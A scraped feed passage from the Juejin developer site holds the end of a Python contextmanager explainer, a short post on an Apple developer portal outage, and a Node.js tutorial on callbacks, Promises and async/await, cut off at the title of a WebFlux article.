<p><code>@contextlib.contextmanager</code> <strong>不是仅仅为了执行 <code>finally</code></strong>，它的作用是：</p>
<ol>
<li><strong>桥接 (Bridge)：</strong> 把“生成器”转换成符合“上下文管理器协议”的对象。</li>
<li><strong>驱动 (Driver)：</strong> 它负责在 <code>__enter__</code> 时启动生成器，在 <code>__exit__</code> 时<strong>恢复</strong>生成器的执行。</li>
</ol>
<p>正是因为它在 <code>__exit__</code> 里手动帮你“踹”了生成器一脚（调用了 <code>next()</code>），生成器才得以从 <code>yield</code> 醒来并往下走，从而执行到了你的 <code>finally</code> 代码块。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[苹果开发者后台叕挂了，P0级别的报错！]]></title>    <link>https://juejin.cn/post/7581457966966325258</link>    <guid>https://juejin.cn/post/7581457966966325258</guid>    <pubDate>2025-12-09T03:40:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581457966966325258" data-draft-id="7581470169839992870" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="苹果开发者后台叕挂了，P0级别的报错！"/> <meta itemprop="keywords" content="APP,Apple,uni-app"/> <meta itemprop="datePublished" content="2025-12-09T03:40:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="iOS研究院"/> <meta itemprop="url" content="https://juejin.cn/user/1421041942671774"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            苹果开发者后台叕挂了，P0级别的报错！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1421041942671774/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    iOS研究院
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T03:40:50.000Z" title="Tue Dec 09 2025 03:40:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">背景</h2>
<p>AppStore的开发者后台，今天早上8点开始又摆烂了。<code>只要进入Apps页面，点击App详情自动触发退出功能。</code></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a1ea8d94b0d54f07b84c75f717d860d4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaU9T56CU56m26Zmi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856449&amp;x-signature=5ebS7cAlOEqaoZbfyIwVpoBJkR4%3D" alt="dad0d392646571955680b365a73d7c42.jpg" loading="lazy"/></p>
<p>还有同行直接直接开启<strong>502状态模式</strong>。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9a57d58aa77f4cbfad5b062338f8b394~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaU9T56CU56m26Zmi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856449&amp;x-signature=FY7TIc2JYE62X60f8DKymDaOdKc%3D" alt="ScreenShot_2025-12-09_112425_505.png" loading="lazy"/></p>
<p><strong>对于这种严重使用线上用户体验的操作，P0级别的事故当之无愧。</strong></p>
<p>当然，这已经不是今年第一次了摆烂了。上一次摆烂的时候是开发者传包之后，<strong>出现了不发邮件或者邮件错乱的情况</strong>。</p>
<p>大致情况为等待审核邮件已经收到了，未能收到状态更新为准备提交的邮件。</p>
<p>导致部分开发者误以为自己忘记了点击提交审核按钮。</p>
<p>希望果子除了对开发者严格之外，也严律利己。不要给开发者增加游戏难度。</p>
<p><strong>目前苹果后台已经恢复正常，开发者可以自行进行提交审核的操作。</strong></p>
<p><code>遵守规则，方得长治久安</code>，最后祝大家大吉大利，今晚过审！</p>
<h3 data-id="heading-1">相关推荐</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FURmC_4vxQv5ttOg8yYe7Eg" target="_blank" title="https://mp.weixin.qq.com/s/URmC_4vxQv5ttOg8yYe7Eg" ref="nofollow noopener noreferrer"># 苹果开发者续费大坑及成功续费方案！亲测有效</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F1bAA90Tzpx03tTHZbdg3aw" target="_blank" title="https://mp.weixin.qq.com/s/1bAA90Tzpx03tTHZbdg3aw" ref="nofollow noopener noreferrer"># AppStore敏感词排查手册，多维度分析Guideline 2.3.1隐藏功能，轻松过审。</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUxMTkxNzAzMw%3D%3D%26mid%3D2247484371%26idx%3D1%26sn%3D33568c58e90a5bf4d2612d803ecb2a27%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUxMTkxNzAzMw==&amp;mid=2247484371&amp;idx=1&amp;sn=33568c58e90a5bf4d2612d803ecb2a27&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer"># 苹果加急审核是“绿色通道”还是“死亡陷阱”？</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUxMTkxNzAzMw%3D%3D%26mid%3D2247484362%26idx%3D1%26sn%3Dea61bd42d5ae8b99d2a56cbfb8d91e88%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUxMTkxNzAzMw==&amp;mid=2247484362&amp;idx=1&amp;sn=ea61bd42d5ae8b99d2a56cbfb8d91e88&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer"># 苹果开发者邮箱，突然收到11.2通知严重么？</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUxMTkxNzAzMw%3D%3D%26mid%3D2247484413%26idx%3D1%26sn%3D82870d4c8892fa65803a8e05fd5ac938%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUxMTkxNzAzMw==&amp;mid=2247484413&amp;idx=1&amp;sn=82870d4c8892fa65803a8e05fd5ac938&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer"># 不想被苹果卡审最好错开这两个提审时间</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUxMTkxNzAzMw%3D%3D%26mid%3D2247484349%26idx%3D1%26sn%3D1c75a6b08cb5de64ddf41a88b61ff108%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUxMTkxNzAzMw==&amp;mid=2247484349&amp;idx=1&amp;sn=1c75a6b08cb5de64ddf41a88b61ff108&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer"># 手撕苹果审核4.3是代码问题还是设计问题？</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUxMTkxNzAzMw%3D%3D%26mid%3D2247484344%26idx%3D1%26sn%3D4399eb8d8bf82e9c5df26a18b8564cfb%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUxMTkxNzAzMw==&amp;mid=2247484344&amp;idx=1&amp;sn=4399eb8d8bf82e9c5df26a18b8564cfb&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer"># 有幸和Appstore审核人员进行了一场视频会议特此记录。</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Node.js 编程实战：深入理解回调函数]]></title>    <link>https://juejin.cn/post/7581412054903013385</link>    <guid>https://juejin.cn/post/7581412054903013385</guid>    <pubDate>2025-12-09T03:41:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581412054903013385" data-draft-id="7581457966966292490" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Node.js 编程实战：深入理解回调函数"/> <meta itemprop="keywords" content="后端,Node.js,Trae"/> <meta itemprop="datePublished" content="2025-12-09T03:41:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员爱钓鱼"/> <meta itemprop="url" content="https://juejin.cn/user/2799775299157614"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Node.js 编程实战：深入理解回调函数
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2799775299157614/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员爱钓鱼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T03:41:09.000Z" title="Tue Dec 09 2025 03:41:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>在 Node.js 的世界里，“回调函数”是一个绕不开的重要概念。无论是文件读写、网络请求、数据库操作，还是各种异步任务，回调都扮演着核心角色。理解回调不仅是掌握 Node.js 的基础，也是深入理解事件循环和异步机制的关键。本文将从概念、应用、优势和问题几个角度，带你系统认识 Node.js 中的回调函数。</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">一、什么是回调函数？</h2>
<p>回调函数（Callback）指的是一个函数作为参数传递给另一个函数，并在特定时机由后者调用。
在 Node.js 中，大量 API 都以回调方式处理异步结果。</p>
<p>简单示例：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">name, callback</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Hello, "</span> + name);
  <span class="hljs-title function_">callback</span>();
}

<span class="hljs-title function_">greet</span>(<span class="hljs-string">"Node.js"</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Greeting finished."</span>);
});
</code></pre>
<p>回调并不是 Node.js 独有的概念，但由于 Node.js 以异步为核心，回调的使用量特别大。</p>
<hr/>
<h2 data-id="heading-1">二、为什么 Node.js 需要回调？</h2>
<p>Node.js 采用事件驱动和非阻塞 I/O 模型。
JavaScript 单线程运行，如果遇到阻塞操作（如读取大文件），会造成程序停顿。
为了避免这种情况，Node.js 选择异步执行操作，把结果通过回调返回，从而让主线程继续处理其他任务。</p>
<p>例如：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">"fs"</span>);

fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">"data.txt"</span>, <span class="hljs-string">"utf8"</span>, <span class="hljs-function">(<span class="hljs-params">err, data</span>) =&gt;</span> {
  <span class="hljs-keyword">if</span> (err) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"读取失败"</span>, err);
    <span class="hljs-keyword">return</span>;
  }
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"文件内容："</span>, data);
});
</code></pre>
<p>文件读取不会阻塞主线程，读取结束后才触发回调，这是 Node.js 高性能的关键。</p>
<hr/>
<h2 data-id="heading-2">三、Node.js 回调的经典形式：错误优先</h2>
<p>多数 Node.js 原生 API 采用“错误优先回调”（Error-first Callback）模式：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">callback</span>(<span class="hljs-params">err, result</span>) { ... }
</code></pre>
<p>这样做有两个好处：</p>
<ol>
<li>明确区分“成功结果”和“失败原因”</li>
<li>调用者可以清晰处理异常，提高代码稳定性</li>
</ol>
<p>例如：</p>
<pre><code class="hljs language-js" lang="js">fs.<span class="hljs-title function_">writeFile</span>(<span class="hljs-string">"test.txt"</span>, <span class="hljs-string">"Hello"</span>, <span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> {
  <span class="hljs-keyword">if</span> (err) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"写入失败："</span>, err);
    <span class="hljs-keyword">return</span>;
  }
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"写入成功"</span>);
});
</code></pre>
<hr/>
<h2 data-id="heading-3">四、回调地狱：回调的最大问题</h2>
<p>当多个异步操作依赖顺序执行时，就可能出现严重嵌套，结构混乱：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">doA</span>(<span class="hljs-function">(<span class="hljs-params">resultA</span>) =&gt;</span> {
  <span class="hljs-title function_">doB</span>(resultA, <span class="hljs-function">(<span class="hljs-params">resultB</span>) =&gt;</span> {
    <span class="hljs-title function_">doC</span>(resultB, <span class="hljs-function">(<span class="hljs-params">resultC</span>) =&gt;</span> {
      <span class="hljs-title function_">doD</span>(resultC, <span class="hljs-function">(<span class="hljs-params">resultD</span>) =&gt;</span> {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"最终结果:"</span>, resultD);
      });
    });
  });
});
</code></pre>
<p>这种问题被称为“回调地狱”（Callback Hell）。
不仅难以阅读，也难以维护。</p>
<hr/>
<h2 data-id="heading-4">五、如何改善回调地狱？</h2>
<p>虽然本文主要讲回调，但了解解决方案能加深理解。</p>
<p>常见改进方式包括：</p>
<h3 data-id="heading-5">1. 使用 Promise</h3>
<p>将回调包装成可链式调用的结构：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">doA</span>()
  .<span class="hljs-title function_">then</span>(doB)
  .<span class="hljs-title function_">then</span>(doC)
  .<span class="hljs-title function_">then</span>(doD)
  .<span class="hljs-title function_">catch</span>(<span class="hljs-variable language_">console</span>.<span class="hljs-property">error</span>);
</code></pre>
<h3 data-id="heading-6">2. 使用 async/await</h3>
<p>进一步让异步代码看起来像同步代码：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">run</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> a = <span class="hljs-keyword">await</span> <span class="hljs-title function_">doA</span>();
    <span class="hljs-keyword">const</span> b = <span class="hljs-keyword">await</span> <span class="hljs-title function_">doB</span>(a);
    <span class="hljs-keyword">const</span> c = <span class="hljs-keyword">await</span> <span class="hljs-title function_">doC</span>(b);
    <span class="hljs-keyword">const</span> d = <span class="hljs-keyword">await</span> <span class="hljs-title function_">doD</span>(c);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"结果:"</span>, d);
  } <span class="hljs-keyword">catch</span> (err) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err);
  }
}
</code></pre>
<p>尽管现代项目更多使用 Promise 或 async/await，但理解回调是理解 Node.js 异步模型的基础。</p>
<hr/>
<h2 data-id="heading-7">六、回调仍然不可或缺</h2>
<p>即便有 Promise 和 async/await，回调依旧在大量底层 API 中使用，比如：</p>
<ul>
<li><code>fs</code> 文件系统模块</li>
<li><code>http</code> 服务器的事件</li>
<li><code>net</code>、<code>dns</code> 等网络模块</li>
<li>自定义事件触发机制</li>
</ul>
<p>此外，在一些对性能要求极高的场景，回调仍然被视为低成本的异步方式。</p>
<hr/>
<h2 data-id="heading-8">七、总结</h2>
<p>回调函数是 Node.js 异步编程的基石。
它的优势是简单直接，不阻塞线程，是 Node.js 高性能的关键。
但回调也有结构复杂、可读性差的问题，因此在现代开发中更常配合 Promise 和 async/await 使用。</p>
<p>掌握回调机制，不仅能帮助你读懂 Node.js 底层 API，也能让你更清晰地理解事件循环、非阻塞 I/O，以及为什么 Node.js 能在高并发场景表现出色。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[新项目为什么推荐WebFlux，而非SpringMVC?]]></title>    <link>https://juejin.cn/post/7581381365494366262</link>    <guid>https://juejin.cn/post/7581381365494366262</guid>    <pubDate>2025-12-09T03:41:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581381365494366262" data-draft-id="7581324707481305129" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="新项目为什么推荐WebFlux，而非SpringMVC?"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-09T03:41:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="苏三说技术"/> <meta itemprop="url" content="https://juejin.cn/user/465848661970824"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            新项目为什么推荐WebFlux，而非SpringMVC?
